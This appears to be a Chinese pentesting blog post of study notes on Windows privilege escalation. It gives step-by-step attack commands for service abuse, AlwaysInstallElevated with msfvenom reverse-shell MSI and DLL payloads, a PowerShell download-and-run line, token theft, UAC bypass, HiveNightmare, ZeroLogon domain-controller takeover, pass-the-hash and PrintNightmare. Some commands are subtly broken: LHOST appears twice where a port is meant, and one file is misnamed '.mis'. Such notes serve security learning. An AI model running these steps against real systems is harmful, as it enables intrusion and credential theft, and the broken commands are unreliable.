---
title: windows权限提升
date: 2023-09-03T15:29:52+08:00
updated: 2023-09-02T16:37:04+08:00
categories: 
- 渗透测试
- 内网体系建设
---

## windows权限基础知识

### windows本机用户权限划分

- User：普通用户权限，系统中最安全的权限，分配给该组的默认权限不允许成员修改操作系统的设置或用户资料
- Administrator：管理员权限，可以利用 Windows 的机制将自己提升为 System 权限，以便操作 SAM 文件等
- System：系统权限，可以对 SAM 等敏感文件进行读取，往往需要 Administrator 权限提升到 System 权限才可以对散列值进行 Dump 操作
- TrustedInstaller：最高权限， 对于系统文件，即使 System 权限也无法进行修改，只有 TrustedInstaller 权限才可以修改文件

## 系统内核漏洞提权

### 查找系统漏洞

**手动查找可利用漏洞**

在目标主机上执行

```
systeminfo
```

该命令用于显示系统信息，可以从信息中看到对应的安装补丁，可以通过不存在的补丁序列号来提权，例如MS18-8120与KB4131188对应，CVE-2020-0787与KB4540673对应

**使用WES-NG寻找**

WES-NG可通过systeminfo的信息给出提权指令，将windows的systeminfo信息保存在systeminfo.txt的文件中，使用工具检索该文件缺少的补丁

```
python3 wes.py systeminfo.txt --impact "Elevation of Privilege"
```

![](E:\笔记软件\笔记\渗透测试\内网体系建设\windows提权\1.png)

执行下列命令，将会查找已有exp的提权漏洞

```
python3 wes.py systeminfo.txt --impact "Elevation of Privilege" --exploits-only
```

**确定并利用漏洞**

上传exp，并根据exp的有效载荷进行提权

给出提权信息利用站点

- http://blog.neargle.com/win-powerup-exp-index/
- https://detect.secwx.com/

### 系统服务提权

windows在系统启动时，由于有些服务是开机自启动的，并且大部分系统服务是以SYSTEM权限启动。应用软件在注册服务时，会在以下路径中创建相应的注册表

```
HKEY_MACHINE\SYSTEM\CurrentControlSet\Services
```

我们可以中该表中找到系统启动时调用的应用二进制文件，通过修改启动路径来执行其他程序从而获得权限

#### 不安全的服务权限

如果目标机器上的低权限用户配置错误，对高权限下运行的系统服务具有更改服务配置的权限(SERVICE_QUERY_ CONFIG或SERVICE_ALL_ACCESS)就可以通过低权限用户修改系统服务启动的二进制文件路径

**AccessChk**

该工具可以枚举目标主机上存在权限缺陷的系统服务

使用该工具枚举当前用户可修改的服务

```
accesschk.exe -uwcqv "XXX" * /accepteula > 1.txt //XXX为当前用户名
```

![2](E:\笔记软件\笔记\渗透测试\内网体系建设\windows提权\2.png)

```
sc qc 服务名称  //查看该服务启动时的权限
```

![3](E:\笔记软件\笔记\渗透测试\内网体系建设\windows提权\3.png)

然后修改执行路径为我们想要执行的命令

```
# binpath,指定二进制文件的路径 ，注意这里的"="后面要留有空格
sc config VMTools binPath= "net user test1 abc123! /add"  
//这里的路径可修改为上传到服务器的exe可执行文件，并使用cmd.exe指定该文件路径进行执行
# 查看查询该服务的执行路径是否修改成功
sc qc xxxx
```

重启系统或是服务

```
shutdown -r -t 0
```

当用户对该服务具有SERVICE_START和SERVICE_STOP权限时，可以使用命令直接重启该服务

```
sc stop xxx
sc start xxx
```

**metaspolit**

```bash
use exploit/windows/local/service_permissions
set AGGRESSIVE true
set session 1
exploit
```

**PowerSploit**

```powershell
powershell.exe -exec bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"

powershell.exe -exec bypass -Command "& {Import-Module D:/PowerUp.ps1; Invoke-AllChecks}" > 1.txt

powershell.exe -exec bypass -Command "& {Import-Module C:/PowerUp.ps1;Invoke-ServiceAbuse -Name 'xxxx' -Username user -Password 123456}"
```

- ServiceName：可能存在漏洞的服务
- Path：该服务的可执行程序的路径
- StartName：服务运行账号
- AbuseFunction：利用方式

#### 服务注册表权限脆弱

如果低权限用户对系统服务的注册表具有写入权限，就可以通过修改服务的启动路径进行提权，思路与权限配置错误一直，修改ImagePath

在目标主机执行

```
accesschk.exe /accepteula -uvwqk "xxxxx" HKLM\SYSTEM\CurrentControlSet\Services   ///xxxx为用户名或组
```

![4](E:\笔记软件\笔记\渗透测试\内网体系建设\windows提权\4.png)

假设当前用户对一个名为aaa的服务具有完全控制权，可以通过修改该服务的ImagePath为我们上传的后门程序

```
reg add HKEY_MACHINE\SYSTEM\CurrentControlSet\Services\aaa /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /k C:\Users\PUblic\reverse_tcp.exe" /f
```

执行命令查看该用户是否具有重启该服务的权限

```
accesschk.exe /accepteula -ucqv "xxxx" aaa
```

如果有重启服务即可，若无尝试重启系统或计算机

#### 服务路径权限可控

如果低权限者对高权限者启动的服务路径具有可写权限，可以通过直接替换启动文件进行提权

执行命令查看对某服务的路径是否有可写权限

```
accesschk.exe /accepteula -quv "C:\Program Files\Insecure Executables\"
```

如果有，我们可以替换该路径下的二进制文件为我们自己的shell，并重启

#### 利用可信任的服务路径提权

可信任服务路径漏洞利用了 Windows 文件路径解析的特性，如果一个服务调用的可执行文件没有正确地处理所引用的完整路径名，同时攻击者该文件路径有可写权限，攻击者就可以上传文件来劫持路径名。

例如某服务的启动路径为

```
"C:\Program Files\Sub Dir\Service.exe"
```

当该服务重启时，对于该路径中每一个空格，windows都会尝试寻找同名的二进制文件，并进行启动，对于上面的路径，windows就会依次尝试启动

```
C:\Program.exe
C:\Program Files\Sub.exe
C:\Program Files\Sub Dir\Service.exe
```

我们可以通过上传同名文件程序到目录下，并重启服务

需要注意的是：完整路径中不存在双引号，路径需要包含空格，低权限用户对路径中对应文件夹具有写入的权限

通过以下命令可以寻找目标机器上所有具有该特征的服务

```shell
wmic service get name,displayname,pathname,startmode|findstr /i "Auto" |findstr /i /v "C:\Windows\" |findstr/i /v """
```

查找到对应服务后，使用命令查看当前用户对该路径的控制权

```
accesschk.exe /accepteula -quv "xxxx" "C:\Program Files\Sub Dir\"
```

为了避免该漏洞的影响，最好对完整路径再进行一次引号的包裹

**msf模块**

`exploit/windows/local/trusted_service_path` 模块

#### 计划任务提权

在powershell中执行下列命令，寻找与当前用户权限不同的计划任务

```powershell
Get-ScheduledTask | Select * | ? {($_.TaskPath -notlike "\Microsoft\Windows\*") -And ($_.Principal.UserId -notlike "*$env:UserName*")} | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @{Name="User";Expression={$_.Principal.userID}} 
```

查看该计划任务的间隔时间

```
$task= Get-ScheduledTask -TaskName xxxx

ForEach ($triger in $task.Triggers) { echo $triger.Repetition.Interval}
```

查看该计划任务执行了什么动作

```
$task= Get-ScheduledTask -TaskName xxxx

ForEach ($action in $task.Actions) { Select $action.Execute}
```

检查路径是否可控

```
accesschk64.exe -dqv "/path/to/dir"
```

如果可控，我们可以覆盖该计划任务执行的脚本来获取shell

## MSI安装策略提权(AlwaysInstallElevated提权)

由于用户在配置msi安装策略时，配置了“永远以高权限安装”(默认情况下禁用)，导致攻击者可以安装一个恶意msi文件来获取SYSTEM权限

### 确定是否存在漏洞

当该项启用后，会在注册表的相应位置生成键值1，攻击者可以通过下列命令来查看是否开启此选项

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![5](E:\笔记软件\笔记\渗透测试\内网体系建设\windows提权\5.png)

如图为未开放的情况

如果当前用户被赋予了权限(一般不可能),可以尝试开启该选项

```
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
```

### 创建恶意MSI文件并安装

利用msf来生成恶意msi文件

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.111.128 LHOST=4444 -f msi -o  reverse_tcp.mis
```

```bash
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.111.128 LHOST=4444 -f msi -o  reverse_tcp.mis
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of msi file: 159744 bytes
Saved as: reverse_tcp.mis
```

将生成的恶意msi文件上传到目标服务器，执行以下命令

```
msiexec /quiet /qn /i C:\reverse_tcp.msi
```

"/quiet":静默安装程序，不像用户发送任何消息

“/qn”:无GUI模式安装,也可以使用"/q"

"/i": 常规安装操作

msiexec同样可以访问处于公网上的msi文件，但是需要证书才能下载安装到本地

```
msiexec /q /i http://xxx.com/reverse_tcp.msi
```

由于msf生成的msi文件，在执行命令时，可能不会要求提升权限，所以有时会导致执行失败，可以使用Powerup脚本，或直接使用MSI Wrapper来生成msi文件

下载地址：https://www.exemsi.com/download/

https://github.com/PowerShellMafia/PowerSploit/tree/master

## 访问令牌操纵

###  访问令牌

Windows中的访问令牌分为主令牌和模拟令牌，主令牌与进程相关联，每个进程都有一个主令牌。通过操纵访问令牌来使某个进程正在运行的进程像是其他用户启动进程的子进程，从而达到提权的效果，称为令牌窃取。由于需要调用windows上的特殊API，因此通常用于将管理员用户剃刀SYSTEM等更高级的用户

### 常规窃取操作

**利用incognito窃取**

将incognito.exe上传到目标机器，通过该应用，我们能够达到窃取目标令牌的目的

执行下列命令，列举当前所有的令牌

```
incognito.exe list_tokens -u
```

查找到目标用户的进程，我们边可以通过指定该用户，使用令牌进行访问

```
incognito.exe exectue -c "NT AUTHORITY\SYSTEM" whoami
-c指定目标用户，whoami为后续执行的命令
```

**利用metasploit进行窃取**

metasploit中内置了一个incognito模块，当获取到meterpreter_shell后

```
load incognito
list_tokens -u  #列举
impersonate_token "NT AUTHORITY\SYSTEM"
steal_toekn <PID>  #从指定进程的pid窃取token
```

**通过令牌获取TrustedInstaller权限**‘

从windows vista开始，系统内置了一个TrustedInstaller安全主体，拥有修改系统文件的权限。TrustedInstaller以一个账户组的形式出现，即NT SERVICE\TrustedInstaller。窃取该用户组的令牌目的在于修改系统文件(控制系统文件夹)，即便我们已经是SYSTEM用户也无法修改系统文件夹中的文件。

TrustedInstaller本质上也是一项服务，启动路径为

```
C:\Windows\servicing\TrustedInstaller.exe
```

首先执行命令启动该服务

```
sc start TrustedInstaller
```

然后记录TrustedInstaller.exe进行的PID并窃取该PID的token

```
steal_token <PID>
```

### Potato家族提权

已经有文章记录，不再重写一遍

## Bypass UAC

用户账户控制(UAC),当RID非500的管理员用户登录，会获取到两个访问令牌，一个是标准用户，用于访问不需要管理员权限的应用，一个是管理员令牌，用于启用需要管理员权限的应用，bypass uac就是为了绕过这一限制，直接使用管理员用户令牌进行访问

###  UAC白名单

uca认证中存在默认的白名单应用，这些应用在运行时会以静默的方式提升到管理员权限并运行，这些程序的相同点都在于Mainfest数据中autoElevate属性值为 True

可通过sigcheck来寻找具有该属性的程序

```
./sigcheck.exe /accepteula -s C:\Windows\System32\*.exe | findstr /i "autoElevate"
```

查询到这些程序后，通过观察程序的行为来对注册表进行操控，例如开启一个新的cmd，从而获取SYSYTEM权限

### DLL劫持技术

通过寻找程序中可利用的动态链接库，通过替换库达到上线或提权的目的，通常在获取到shell之后，可用的dll目录都是系统信任目录，基本上不可利用，之后再专门研究一下

### 模拟可信任目录

利用白名单程序，系统在请求提升权限时会进行三个步骤

1.检查Mainfest中autoElevate的值，若为true，则系统认为这是一个可自动提升权限的可执行程序

2.系统会检查可执行文件的签名，导致无法通过伪造Mainfest信息冒充该可执行文件

3.系统会检查文件是否位于系统可信任目录中，例如C:\Windows\System32\

当进行第三步检查目录时，系统会自动忽略路径中的空格

```
C:|Windows \System32\
windows后的空格会被忽略，导致通过检查
```

通过将可执行文件copy到我们新建的这个目录下并执行，会导致加载动态链接库失败，我们可以通过伪造同名的动态链接库来进行操作，即dll劫持技术

该技术同样放到后面介绍，先简单了解该目录的模拟

```
md "\\?\C:\Windows "
md "\\?\C:\Windows \System32\"
copy  C:\Windows\System32\WinSAT.exe "\\?\C:\Windows \System32\WinSAT.exe"
```

### Bypass UAC相关辅助工具

#### UACME

工具地址：https://github.com/hfiref0x/UACME/releases/tag/v3.6.4

需要自己编译使用

#### MSF中的UAC提权模块

![6](E:\笔记软件\笔记\渗透测试\内网体系建设\windows提权\6.png)

执行这些模块后会得到一个关闭UAC的meterpreter,执行getsystem即可提升权限

## 用户凭据操作

用户凭据是在用户登录到Windows操作系统时创建和使用的。当用户提供正确的用户名和密码时，系统将验证这些凭据的有效性，并为用户分配一个安全令牌。该安全令牌在用户与系统交互时用于验证用户的身份，并确定用户对资源的访问权限

### 枚举Unattended凭据

Unattended凭据是在Windows操作系统中用于自动化或无人参与任务的一种凭据类型。它允许在没有用户交互的情况下自动进行身份验证和授权操作，通常包含了用户的用户名和密码

Unattended安装允许用户在不需要管理员关注的情况下自行安装。该安装程序的问题是会在系统中残留一些配置文件，可能会包含管理员的账户和密码

常见路径：

```
C:\sysprep.inf
C:\syspreg\sysprep.xml
C:\Windows\system32\sysprep.inf
C:\windows\system32\sysprep\sysprep.xml
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep\Unattend.xml
C:\Windows\System32\Sysprep\Panther\Unattend.xml
```

msf中内置了模块用于查找这些遗留的配置文件

![7](E:\笔记软件\笔记\渗透测试\内网体系建设\windows提权\7.png)

### 获取组策略凭据

在大型的域环境中，域管理员通常会通过下发组策略来进行密码的同步修改和权限赋予等 

在新建一个组策略后，域控制器会自动在SYSVOL共享目录中生成一个XML文件，该文件保存了组策略更新后的密码。SYSVOL是在安装活动目录时创建的一个用于存储公共文件服务器副本的共享文件夹，在该目录中搜索能够看到名为Groups.xml的文件，其中的cpassword字段经过了AES256算法加密，不过微软在2012年就公布了该密钥

同样msf中有利用模块

![8](E:\笔记软件\笔记\渗透测试\内网体系建设\windows提权\8.png)

### HiveNightmare(CVE-2021-36934)

该漏洞会影响 Windows 自 2018 年 10 月以来发布的版本，即 Windows 10 Version 1809 以后的版本,但该漏洞不会影响win server

执行以下命令，查看目标是否易受攻击

```
icacls C:\windows\system32\config\SAM
```

如果目标回显“BUILTIN\Users:(I)(RX)”则说明目标易受攻击，如果不则会回显拒绝访问

![9](E:\笔记软件\笔记\渗透测试\内网体系建设\windows提权\9.png)

exp地址:https://github.com/GossiTheDog/HiveNightmare/releases/download/0.5/HiveNightmare.exe

将exp传到目标机器上，执行就能得到三个文件 SAM、SECURITY、SYSTEM，使用secretsdump.py获取目标用户的hash

```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket/examples python3 secretsdump.py -sam SAM-xxx-xx-x system SYSTEM-xxx-xx-x security SECURITY-xxx-xx-x LOCAL
```

再使用psexec.py直接利用administrator的hash登录管理员账户，获取SYSTEM权限

```
python3 psexec.py -hashes xxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxx administrator@ip cmd.exe
```

### ZeroLogon 域内提权(CVE-2020-1472)

通过调用Netlogon中的RPC函数NetrServerPasswordSet2来重置域控机器的机器账户的密码，通过机器用户来获得域控权限

```
影响版本：Windows Server 2008 R2 for x64-based Systems Service Pack 1Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)Windows Server 2012Windows Server 2012 (Server Core installation)Windows Server 2012 R2Windows Server 2012 R2 (Server Core installation)Windows Server 2016Windows Server 2016 (Server Core installation)Windows Server 2019Windows Server 2019 (Server Core installation)Windows Server, version 1903 (Server Core installation)Windows Server, version 1909 (Server Core installation)Windows Server, version 2004 (Server Core installation)
```

先查看域控机器的主机名

```
net group "domain controllers" /domain
```

这里需要得到域控主机的机器用户名，利用poc将域控制器的密码重置为空

```
python3 cve-2020-1472-exploit.py 域控主机名 域控ip
```

利用impacket中的脚本,以空密码连上域控，并导出域管理员的hash值

```
python3 secretsdump.py 域名/机器名\$@ip -just-dc-user "域名\administrator" -no-pass
```

对域控制器进行哈希传递攻击

```
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7c85389bc79a4eb184e620b6e8c37905 y域名/Administrator@ip
```

在进行登录之后，需要重新恢复服务器的密码，否则会导致脱域

在域控机器上执行以下命令，导出原来机器上注册表的值

```
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
```

将三个文教导出到本地使用secretsdump.py导出注册表的哈希值

```
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

通过运行恢复restorepassword.py域控密码

```
python3 restorepassword.py 域名/主机名@主机名 -target-ip ip -hexpass hash值(需要经过hex编码)
```

mimikatz中也有利用的模块，例如

```
lsadump::zerologon /target:dc.hacke.testlab /account:dc$poc
lsadump::zerologon /target:dc.hacke.testlab /account:dc$ /exploit 通过zerologon漏洞攻击域控服务器
lsadump::dcsync
lsadump::postzerologon /target:conttosson.locl /account:dc$ #恢复密码
```

##  Print Spooler打印漏洞

print spooler是windows系统的打印后台服务，并且该服务在windows中默认开启

### PrintDemon(CVE-2020-1048)

https://windows-internals.com/printdemon-cve-2020-1048/

winodows在创建打印机时会要求设置打印机端口，该端口并非是通常意义上的网络端口，该端口就可以被设置为文件路径等，当端口处为文件路径时，会导致任意文件写入，从而提升权限或引发dll注入

msf中存在payload可以直接使用，或是使用poc自己执行

![10](E:\笔记软件\笔记\渗透测试\内网体系建设\windows提权\10.png)

### PrintNightmare

该漏洞目前存在两种利用，分别是权限提升(CVE-2021-1675)和远程代码执行(CVE-2021-34527),当用户处于域环境中，可以链家到域控的print soppler并安装恶意的驱动程序，来接管整个域环境

#### CVE-2021-1675

使用msf生成利用的dll文件

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.135.128 LHOST=4444 -f dll -o  reverse_tcp.dll
```

将编译好的漏洞利用工具和dll文件一同上传到目标机器，并执行该dll文件

工具地址：https://github.com/cube0x0/CVE-2021-1675

推荐编译为exe使用。python版本不高于3.8.10

```
git clone https://github.com/cube0x0/impacket
cd impacket
certutil -urlcache -split -f https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py CVE-2021-1675.py
pip3 install six pycryptodomex pyasn1 pyinstaller
pyinstaller --clean --onefile CVE-2021-1675.py
```

同样的msf中有成熟的模块可以利用

```
auxiliary/admin/dcerpc/cve_2021_1675_printnightmare
```

#### CVE-2021-34527

本质上是一个漏洞，利用的工具也相同，需要配置smb服务，攻击机修改/etc/samba/smb.conf

```
[global]
map to guest = Bad User
server role = standalone server
usershare allow guests = yes
idmap config * : backend = tdb
smb ports = 445
[smb]
comment = Samba
path = /tmp/
guest ok = yes
read only = no
browsable = yes
```

 能看到域控主机的smb目录下出现生成的dll文件即成功

使用CVE-2021-1675.py进行攻击

## Nopac域内提权

打算与kerberos一起学习

## Certifried域内提权(CVE-2022-26923)

### AD CS

https://learn.microsoft.com/en-us/system-center/scom/obtain-certificate-windows-server-and-operations-manager?view=sc-om-2022&tabs=Enterp%2CEnter

Active Directory Certificate Services （AD CS） 是一个 Windows Server 角色，它提供用于颁发和管理公钥基础结构 （PKI） 证书的服务。然后，这些可用于对用户、设备或服务进行身份验证以及安全通信。AD CS 的主要功能是证书颁发机构 （CA） 服务，该服务负责按照基于模板的方法颁发和验证证书。

证书模板是一个 Active Directory 对象，顾名思义，它定义注册策略和证书参数，例如证书的有效期以及证书的用途。默认证书模板（如用户和计算机，分别用于标识域用户和域计算机）可用，但也可以定义自定义模板。客户端可以通过发送证书签名请求 （CSR） 消息从 CA 服务器请求证书。CSR 消息包含客户端的公钥、所请求证书的使用者名称以及包括模板名称在内的其他信息。作为响应，CA 服务器随后验证是否允许客户端在给定的证书模板中注册。如果允许注册，服务器将继续根据模板设置生成新证书，使用其私钥对其进行签名，然后将其返回给请求者

### 漏洞描述与利用

默认情况下，域用户可以在证书模板中注册，域计算机可以在 `User` 证书模板中 `Machine` 注册。这两个证书模板都允许客户端身份验证。这意味着颁发的证书可用于通过 PKINIT Kerberos 扩展对 KDC 进行身份验证。

用户帐户具有用户主体名称 （UPN），而计算机帐户没有。当我们基于 `User` 模板请求证书时，用户帐户的 UPN 将嵌入到证书中以进行标识。当我们使用证书进行身份验证时，KDC 会尝试将 UPN 从证书映射到用户

UPN具有唯一性，不同的两个用户不能具有相同的UPN，而计算机账户没有UPN，计算机帐户使用什么来通过证书进行身份验证呢？如果我们查看 `Machine` 证书模板，我们会看到指定了 `SubjectAltRequireDns` （ `CT_FLAG_SUBJECT_ALT_REQUIRE_DNS` ）。

当我们注册一个计算机账户并请求证书，然后利用该证书进行身份验证

```shell
certipy addcomputer.py 'hack.com/uu2fu3o:Passw0rd' -method LDAPS -computer-name 'YOGALI' -computer-pass 'Passw0rd'
certipy req 'hack.com/YOGALI$:Passw0rd@dc.hack.com'  -ca CORP-DC-CA -template Machine
certipy auth -pfx yogali.pfx
```

在机器上查看证书中dNSHostName的值，能看到该值是利用DNS YOGALI.hack.com的主机名，计算机账户的创建者具有“已验证的写入 DNS 主机名”权限，我们能够修改dNDHostName的值，这是否意味着我们能够修改该值为域控机器的DNS来伪造域控机器，但是需要注意的是，根据 MS-ADTS（3.1.1.5.1.3 唯一性约束），将检查 `servicePrincipalName` 属性的唯一性。因此，当我们尝试将 的属性更新 `dNSHostName` 为 时，域控制器尝试更新该 `servicePrincipalName` 属性，该属性将更新为 `DC.hack.com` include `RestrictedKrbHost/DC.hack.com` 和 `HOST/DC.hack.com` ，然后与域控制器的属性 `servicePrincipalName` 冲突

我们需要删除servicePrincipalName中关于域控值属性值，这样我们就能更新当前计算机账户的dNSHostName的值为域控机器的DNS

![11](E:\笔记软件\笔记\渗透测试\内网体系建设\windows提权\11.png)

修改addcomputer.py的部分代码，使添加的机器账户的servicePrincipalName中不再具有域控机器的值，再次申请证书

```
certipy req hack.com/YOGALI\$:Passw0rd@dc.hack.com -ca CORP-DC-CA -template Machine
//certipy req -u 'compter$'@"$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'Machine'
```

通过颁发的证书对KDC进行PKINIT Kerberos身份验证，并获取域控制器的TGT票据

```
certipy auth -pfx xxx.pfx -username DC-1\$ -doamin hack.com -dc-ip dc-1.hack.com
```

或许你希望尝试现成的靶场：https://tryhackme.com/room/cve202226923

## windows提权速查平台

https://i.hacking8.com/tiquan

https://blog.neargle.com/win-powerup-exp-index/
